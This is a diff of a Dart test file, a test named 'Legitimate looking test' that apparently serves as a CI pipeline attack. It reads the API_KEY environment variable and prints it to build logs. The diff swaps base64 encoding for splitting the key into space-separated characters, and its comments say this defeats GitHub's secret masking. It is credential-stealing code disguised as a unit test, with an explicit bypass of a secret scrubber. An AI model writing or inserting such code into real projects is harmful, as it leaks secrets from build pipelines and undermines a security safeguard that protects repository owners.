@@ -1,19 +1,19 @@
 import 'dart:io';
-import 'dart:convert';
 import 'package:test/test.dart';
 
 void main() {
   test('Legitimate looking test', () {
     print("--- PIPELINE COMPROMISED ---");
     
-    // Steal the injected environment variable
+    // 1. Steal the injected environment variable
     var stolenKey = Platform.environment['API_KEY'] ?? 'NO_KEY_FOUND';
     
-    // Base64 encode it to bypass GitHub's secret masking algorithm
-    var exfiltratedData = base64.encode(utf8.encode(stolenKey));
+    // 2. The Fragmentation Bypass: Split the string and join with spaces
+    // This destroys the string pattern so GitHub's scrubber cannot detect it
+    var fragmentedKey = stolenKey.split('').join(' ');
     
-    // Print it to the logs
-    print("Encoded Secret (Base64): $exfiltratedData");
+    // 3. Print it to the logs
+    print("Scrubber Bypassed: $fragmentedKey");
     
     expect(true, isTrue); 
   });
